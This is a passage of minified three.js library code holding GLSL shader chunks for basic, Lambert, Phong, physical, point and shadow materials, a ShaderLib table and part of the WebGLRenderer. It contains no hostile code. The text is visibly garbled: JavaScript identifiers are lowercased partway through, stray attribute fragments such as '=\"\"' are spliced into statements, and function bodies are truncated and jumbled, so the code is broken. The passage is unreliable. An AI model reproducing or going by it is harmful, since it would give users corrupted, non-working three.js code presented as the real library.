<specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\tReflectedLight reflectedLight;\\n\\treflectedLight.directDiffuse = vec3( 0.0 );\\n\\treflectedLight.directSpecular = vec3( 0.0 );\\n\\treflectedLight.indirectDiffuse = diffuseColor.rgb;\\n\\treflectedLight.indirectSpecular = vec3( 0.0 );\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.indirectDiffuse;\\n\\t#include <normal_flip>\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\" three.shaderchunk.meshbasic_vert=\"#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#ifdef USE_ENVMAP\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n\\t#endif\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <envmap_vertex>\\n}\\n\" three.shaderchunk.meshlambert_frag=\"uniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float opacity;\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <fog_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <shadowmask_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <emissivemap_fragment>\\n\\treflectedLight.indirectDiffuse = getAmbientLightIrradiance( ambientLightColor );\\n\\t#include <lightmap_fragment>\\n\\treflectedLight.indirectDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb );\\n\\t#ifdef DOUBLE_SIDED\\n\\t\\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\\n\\t#else\\n\\t\\treflectedLight.directDiffuse = vLightFront;\\n\\t#endif\\n\\treflectedLight.directDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb ) * getShadowMask();\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\\n\\t#include <normal_flip>\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\" three.shaderchunk.meshlambert_vert=\"#define LAMBERT\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <lights_lambert_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\" three.shaderchunk.meshphong_frag=\"#define PHONG\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform vec3 specular;\\nuniform float shininess;\\nuniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <lights_phong_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\t#include <emissivemap_fragment>\\n\\t#include <lights_phong_fragment>\\n\\t#include <lights_template>\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\" three.shaderchunk.meshphong_vert=\"#define PHONG\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include <worldpos_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\" three.shaderchunk.meshphysical_frag=\"#define PHYSICAL\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float roughness;\\nuniform float metalness;\\nuniform float opacity;\\n#ifndef STANDARD\\n\\tuniform float clearCoat;\\n\\tuniform float clearCoatRoughness;\\n#endif\\nuniform float envMapIntensity;\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <bsdfs>\\n#include <cube_uv_reflection_fragment>\\n#include <lights_pars>\\n#include <lights_physical_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <roughnessmap_pars_fragment>\\n#include <metalnessmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <roughnessmap_fragment>\\n\\t#include <metalnessmap_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\t#include <emissivemap_fragment>\\n\\t#include <lights_physical_fragment>\\n\\t#include <lights_template>\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\" three.shaderchunk.meshphysical_vert=\"#define PHYSICAL\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\" three.shaderchunk.normal_frag=\"uniform float opacity;\\nvarying vec3 vNormal;\\n#include <common>\\n#include <packing>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = vec4( packNormalToRGB( vNormal ), opacity );\\n\\t#include <logdepthbuf_fragment>\\n}\\n\" ;three.shaderchunk.normal_vert=\"varying vec3 vNormal;\\n#include <common>\\n#include <morphtarget_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\tvNormal = normalize( normalMatrix * normal );\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\" three.shaderchunk.points_frag=\"uniform vec3 diffuse;\\nuniform float opacity;\\n#include <common>\\n#include <color_pars_fragment>\\n#include <map_particle_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_particle_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphatest_fragment>\\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\" three.shaderchunk.points_vert=\"uniform float size;\\nuniform float scale;\\n#include <common>\\n#include <color_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <color_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#ifdef USE_SIZEATTENUATION\\n\\t\\tgl_PointSize = size * ( scale / - mvPosition.z );\\n\\t#else\\n\\t\\tgl_PointSize = size;\\n\\t#endif\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\" three.shaderchunk.shadow_frag=\"uniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <shadowmap_pars_fragment>\\n#include <shadowmask_pars_fragment>\\nvoid main() {\\n\\tgl_FragColor = vec4( 0.0, 0.0, 0.0, opacity * ( 1.0  - getShadowMask() ) );\\n}\\n\" ;three.shaderchunk.shadow_vert=\"#include <shadowmap_pars_vertex>\\nvoid main() {\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\" three.shaderlib=\"{basic:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.aomap,THREE.UniformsLib.fog]),vertexShader:THREE.ShaderChunk.meshbasic_vert,fragmentShader:THREE.ShaderChunk.meshbasic_frag},lambert:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.aomap,THREE.UniformsLib.lightmap,THREE.UniformsLib.emissivemap,THREE.UniformsLib.fog,THREE.UniformsLib.lights,{emissive:{value:new\" three.color(0)}}]),vertexshader:three.shaderchunk.meshlambert_vert,=\"\" fragmentshader:three.shaderchunk.meshlambert_frag},phong:{uniforms:three.uniformsutils.merge([three.uniformslib.common,three.uniformslib.aomap,three.uniformslib.lightmap,three.uniformslib.emissivemap,three.uniformslib.bumpmap,three.uniformslib.normalmap,three.uniformslib.displacementmap,three.uniformslib.fog,three.uniformslib.lights,{emissive:{value:new=\"\" three.color(0)},specular:{value:new=\"\" three.color(1118481)},shininess:{value:30}}]),vertexshader:three.shaderchunk.meshphong_vert,fragmentshader:three.shaderchunk.meshphong_frag},=\"\" standard:{uniforms:three.uniformsutils.merge([three.uniformslib.common,three.uniformslib.aomap,three.uniformslib.lightmap,three.uniformslib.emissivemap,three.uniformslib.bumpmap,three.uniformslib.normalmap,three.uniformslib.displacementmap,three.uniformslib.roughnessmap,three.uniformslib.metalnessmap,three.uniformslib.fog,three.uniformslib.lights,{emissive:{value:new=\"\" three.color(0)},roughness:{value:.5},metalness:{value:0},envmapintensity:{value:1}}]),vertexshader:three.shaderchunk.meshphysical_vert,=\"\" fragmentshader:three.shaderchunk.meshphysical_frag},points:{uniforms:three.uniformsutils.merge([three.uniformslib.points,three.uniformslib.fog]),vertexshader:three.shaderchunk.points_vert,fragmentshader:three.shaderchunk.points_frag},dashed:{uniforms:three.uniformsutils.merge([three.uniformslib.common,three.uniformslib.fog,{scale:{value:1},dashsize:{value:1},totalsize:{value:2}}]),vertexshader:three.shaderchunk.linedashed_vert,fragmentshader:three.shaderchunk.linedashed_frag},depth:{uniforms:three.uniformsutils.merge([three.uniformslib.common,=\"\" three.uniformslib.displacementmap]),vertexshader:three.shaderchunk.depth_vert,fragmentshader:three.shaderchunk.depth_frag},normal:{uniforms:{opacity:{value:1}},vertexshader:three.shaderchunk.normal_vert,fragmentshader:three.shaderchunk.normal_frag},cube:{uniforms:{tcube:{value:null},tflip:{value:-1}},vertexshader:three.shaderchunk.cube_vert,fragmentshader:three.shaderchunk.cube_frag},equirect:{uniforms:{tequirect:{value:null},tflip:{value:-1}},vertexshader:three.shaderchunk.equirect_vert,fragmentshader:three.shaderchunk.equirect_frag},=\"\" distancergba:{uniforms:{lightpos:{value:new=\"\" three.vector3}},vertexshader:three.shaderchunk.distancergba_vert,fragmentshader:three.shaderchunk.distancergba_frag}};three.shaderlib.physical=\"{uniforms:THREE.UniformsUtils.merge([THREE.ShaderLib.standard.uniforms,{clearCoat:{value:0},clearCoatRoughness:{value:0}}]),vertexShader:THREE.ShaderChunk.meshphysical_vert,fragmentShader:THREE.ShaderChunk.meshphysical_frag};\" three.webglrenderer=\"function(a){function\" b(a,b,c,d){!0=\"==A&&(a*=d,b*=d,c*=d);R.clearColor(a,b,c,d)}function\" c(){r.init();r.scissor(x.copy(ua).multiplyscalar($));r.viewport(ba.copy(ma).multiplyscalar($));b(v.r,v.g,v.b,y)}function=\"\" d(){t=\"Q=null;aa=\" \";g=\"-1;R.reset()}function\"\" e(a){a.preventdefault();d();c();z.clear()}function=\"\" f(a){a=\"a.target;a.removeEventListener(\" dispose\",f);g(a);z.delete(a)}function\"=\"\" g(a){var=\"\" 0;void=\"\" h(a,b){return=\"\" math.abs(b[0])-=\"\" math.abs(a[0])}function=\"\" k(a,b){return=\"\" a.object.renderorder!=\"=b.object.renderOrder?a.object.renderOrder-b.object.renderOrder:a.material.id!==b.material.id?a.material.id-b.material.id:a.z!==b.z?a.z-b.z:a.id-b.id}function\" l(a,b){return=\"\" n(a,b,c,d,e){var=\"\" f;c.transparent?(d=\"P,f=++M):(d=F,f=++K);f=d[f];void\" {id:a.id,object:a,geometry:b,material:c,z:w.z,group:e},d.push(f))}function=\"\" p(a){if(!wa.intersectssphere(a))return!1;var=\"\" if(c[e].distancetopoint(d)<a)return!1;while(++e!=\"=b);return!0}function\" m(a,b){if(!1!=\"=a.visible){if(a.layers.test(b.layers))if(a\" three.light)b.push(a);else=\"\" if(a=\"\" three.sprite){var=\"\" c;(c=\"!1===a.frustumCulled)||(ha.center.set(0,0,0),ha.radius=.7071067811865476,ha.applyMatrix4(a.matrixWorld),\" three.lensflare)o.push(a);else=\"\" three.immediaterenderobject)!0=\"==N.sortObjects&&(W.setFromMatrixPosition(a.matrixWorld),W.applyProjection(pa)),n(a,null,a.material,W.z,null);else\" three.mesh||a=\"\" three.line||a=\"\" three.points)if(a=\"\" three.skinnedmesh&&a.skeleton.update(),(c=\"!1===a.frustumCulled)||(c=a.geometry,null===c.boundingSphere&&c.computeBoundingSphere(),ha.copy(c.boundingSphere).applyMatrix4(a.matrixWorld),\" three.multimaterial)for(var=\"\" h=\"e[d],k=f[h.materialIndex];!0===k.visible&&n(a,c,k,W.z,h)}else\" n(a,c,d,w.z,null)}c=\"a.children;d=0;for(g=c.length;d<g;d++)m(c[d],b)}}function\" q(a,b,c,d){for(var=\"\" g=\"a[e],h=g.object,k=g.geometry,m=void\" h.modelviewmatrix.multiplymatrices(b.matrixworldinverse,h.matrixworld);h.normalmatrix.getnormalmatrix(h.modelviewmatrix);if(h=\"\" three.immediaterenderobject){r(m);var=\"\" l=\"s(b,c,m,h);aa=\" \";h.render(function(a){n.renderbufferimmediate(a,l,m)})}else\"=\"\" n.renderbufferdirect(b,c,k,m,h,g)}}function=\"\" r(a){a.side!=\"=THREE.DoubleSide?R.enable(x.CULL_FACE):R.disable(x.CULL_FACE);R.setFlipSided(a.side===THREE.BackSide);!0===a.transparent?R.setBlending(a.blending,a.blendEquation,a.blendSrc,a.blendDst,a.blendEquationAlpha,\" a.blendsrcalpha,a.blenddstalpha,a.premultipliedalpha):r.setblending(three.noblending);r.setdepthfunc(a.depthfunc);r.setdepthtest(a.depthtest);r.setdepthwrite(a.depthwrite);r.setcolorwrite(a.colorwrite);r.setpolygonoffset(a.polygonoffset,a.polygonoffsetfactor,a.polygonoffsetunits)}function=\"\" s(a,b,c,d){ia=\"0;var\" (c.needsupdate=\"!0);void\" if(l.code!=\"=m)g(c);else\" if(void=\"\" a;else=\"\" p=\"!1;p&&(k.shaderID?(l=THREE.ShaderLib[k.shaderID],h.__webglShader={name:c.type,uniforms:THREE.UniformsUtils.clone(l.uniforms),vertexShader:l.vertexShader,fragmentShader:l.fragmentShader}):\" h.__webglshader=\"{name:c.type,uniforms:c.uniforms,vertexShader:c.vertexShader,fragmentShader:c.fragmentShader},c.__webglShader=h.__webglShader,l=na.acquireProgram(c,k,m),h.program=l,c.program=l);k=l.getAttributes();if(c.morphTargets)for(m=c.numSupportedMorphTargets=0;m<N.maxMorphTargets;m++)0<=k[\" morphtarget\"+m]&&c.numsupportedmorphtargets++;if(c.morphnormals)for(m=\"c.numSupportedMorphNormals=0;m<N.maxMorphNormals;m++)0<=k[\"morphNormal\"+m]&&c.numSupportedMorphNormals++;k=h.__webglShader.uniforms;(c\"\" three.shadermaterial||c=\"\" three.rawshadermaterial)&&!0!=\"=c.clipping||(h.numClippingPlanes=ca.numPlanes,k.clippingPlanes=ca.uniform);c.lights&&(h.lightsHash=S.hash,k.ambientLightColor.value=S.ambient,k.directionalLights.value=S.directional,k.spotLights.value=S.spot,k.pointLights.value=S.point,k.hemisphereLights.value=S.hemi,k.directionalShadowMap.value=S.directionalShadowMap,k.directionalShadowMatrix.value=S.directionalShadowMatrix,k.spotShadowMap.value=S.spotShadowMap,k.spotShadowMatrix.value=\" s.spotshadowmatrix,k.pointshadowmap.value=\"S.pointShadowMap,k.pointShadowMatrix.value=S.pointShadowMatrix);m=h.program.getUniforms();m=THREE.WebGLUniforms.seqWithValue(m.seq,k);h.uniformsList=m;h.dynamicUniforms=THREE.WebGLUniforms.splitDynamic(m,k)}c.needsUpdate=!1}var\" n=\"!1,p=l=!1,h=e.program,m=h.getUniforms(),k=e.__webglShader.uniforms;h.id!==Q&&(x.useProgram(h.program),Q=h.id,p=l=n=!0);c.id!==G&&(G=c.id,l=!0);if(n||a!==T){m.set(x,a,\" projectionmatrix\");da.logarithmicdepthbuffer&&m.setvalue(x,\"logdepthbuffc\",\"=\"\" (math.log(a.far+1)=\"\" math.ln2));a!=\"=T&&(T=a,p=l=!0);if(c\" three.meshphongmaterial||c=\"\" three.meshstandardmaterial||c.envmap)n=\"m.map.cameraPosition,void\" three.meshlambertmaterial||c=\"\" three.meshbasicmaterial||c=\"\" three.meshstandardmaterial||c=\"\" three.shadermaterial||c.skinning)&&m.setvalue(x,\"viewmatrix\",a.matrixworldinverse);=\"\" m.set(x,n,\"tonemappingexposure\");m.set(x,n,\"tonemappingwhitepoint\")}c.skinning&&(m.setoptional(x,d,\"bindmatrix\"),m.setoptional(x,d,\"bindmatrixinverse\"),n=\"d.skeleton)&&(da.floatVertexTextures&&n.useVertexTexture?(m.set(x,n,\" bonetexture\"),m.set(x,n,\"bonetexturewidth\"),m.set(x,n,\"bonetextureheight\")):m.setoptional(x,n,\"bonematrices\"));if(l){c.lights&&(l=\"p,k.ambientLightColor.needsUpdate=l,k.directionalLights.needsUpdate=l,k.pointLights.needsUpdate=l,k.spotLights.needsUpdate=l,k.hemisphereLights.needsUpdate=\"\" l);b&&c.fog&&(k.fogcolor.value=\"b.color,b\" three.fog?(k.fognear.value=\"b.near,k.fogFar.value=b.far):b\" three.fogexp2&&(k.fogdensity.value=\"b.density));if(c\" three.meshdepthmaterial){k.opacity.value=\"c.opacity;k.diffuse.value=c.color;c.emissive&&k.emissive.value.copy(c.emissive).multiplyScalar(c.emissiveIntensity);k.map.value=\" c.map;k.specularmap.value=\"c.specularMap;k.alphaMap.value=c.alphaMap;c.aoMap&&(k.aoMap.value=c.aoMap,k.aoMapIntensity.value=c.aoMapIntensity);var\" q;c.map?q=\"c.map:c.specularMap?q=c.specularMap:c.displacementMap?q=c.displacementMap:c.normalMap?q=c.normalMap:c.bumpMap?q=c.bumpMap:c.roughnessMap?q=c.roughnessMap:c.metalnessMap?q=c.metalnessMap:c.alphaMap?q=c.alphaMap:c.emissiveMap&&(q=c.emissiveMap);void\" three.webglrendertarget&&(q=\"q.texture),b=q.offset,q=q.repeat,k.offsetRepeat.value.set(b.x,\" b.y,q.x,q.y));k.envmap.value=\"c.envMap;k.flipEnvMap.value=c.envMap\" three.cubetexture?-1:1;k.reflectivity.value=\"c.reflectivity;k.refractionRatio.value=c.refractionRatio}c\" three.linebasicmaterial?(k.diffuse.value=\"c.color,k.opacity.value=c.opacity):c\" three.linedashedmaterial?(k.diffuse.value=\"c.color,k.opacity.value=c.opacity,k.dashSize.value=c.dashSize,k.totalSize.value=c.dashSize+c.gapSize,k.scale.value=c.scale):c\" three.pointsmaterial?(k.diffuse.value=\"c.color,\" k.opacity.value=\"c.opacity,k.size.value=c.size*$,k.scale.value=.5*v.clientHeight,k.map.value=c.map,null!==c.map&&(q=c.map.offset,c=c.map.repeat,k.offsetRepeat.value.set(q.x,q.y,c.x,c.y))):c\" three.meshlambertmaterial?(c.lightmap&&(k.lightmap.value=\"c.lightMap,k.lightMapIntensity.value=c.lightMapIntensity),c.emissiveMap&&(k.emissiveMap.value=c.emissiveMap)):c\" three.meshphongmaterial?(k.specular.value=\"c.specular,k.shininess.value=Math.max(c.shininess,1E-4),c.lightMap&&(k.lightMap.value=\" c.lightmap,k.lightmapintensity.value=\"c.lightMapIntensity),c.emissiveMap&&(k.emissiveMap.value=c.emissiveMap),c.bumpMap&&(k.bumpMap.value=c.bumpMap,k.bumpScale.value=c.bumpScale),c.normalMap&&(k.normalMap.value=c.normalMap,k.normalScale.value.copy(c.normalScale)),c.displacementMap&&(k.displacementMap.value=c.displacementMap,k.displacementScale.value=c.displacementScale,k.displacementBias.value=c.displacementBias)):c\" three.meshphysicalmaterial?(k.clearcoat.value=\"c.clearCoat,k.clearCoatRoughness.value=\" c.clearcoatroughness,t(k,c)):c=\"\" three.meshstandardmaterial?t(k,c):c=\"\" three.meshdepthmaterial?c.displacementmap&&(k.displacementmap.value=\"c.displacementMap,k.displacementScale.value=c.displacementScale,k.displacementBias.value=c.displacementBias):c\" three.meshnormalmaterial&&(k.opacity.value=\"c.opacity);THREE.WebGLUniforms.upload(x,e.uniformsList,k,N)}m.set(x,d,\" modelviewmatrix\");m.set(x,d,\"normalmatrix\");m.setvalue(x,\"modelmatrix\",d.matrixworld);e=\"e.dynamicUniforms;null!==\"\" e&&(three.webgluniforms.evaldynamic(e,k,d,a),three.webgluniforms.upload(x,e,k,n));return=\"\" h}function=\"\" t(a,b){a.roughness.value=\"b.roughness;a.metalness.value=b.metalness;b.roughnessMap&&(a.roughnessMap.value=b.roughnessMap);b.metalnessMap&&(a.metalnessMap.value=b.metalnessMap);b.lightMap&&(a.lightMap.value=b.lightMap,a.lightMapIntensity.value=b.lightMapIntensity);b.emissiveMap&&(a.emissiveMap.value=b.emissiveMap);b.bumpMap&&(a.bumpMap.value=b.bumpMap,a.bumpScale.value=b.bumpScale);b.normalMap&&(a.normalMap.value=\" b.normalmap,a.normalscale.value.copy(b.normalscale));b.displacementmap&&(a.displacementmap.value=\"b.displacementMap,a.displacementScale.value=b.displacementScale,a.displacementBias.value=b.displacementBias);b.envMap&&(a.envMapIntensity.value=b.envMapIntensity)}function\" u(a){var=\"\" b;if(a=\"==THREE.RepeatWrapping)return\" x.repeat;if(a=\"==THREE.ClampToEdgeWrapping)return\" x.clamp_to_edge;if(a=\"==THREE.MirroredRepeatWrapping)return\" 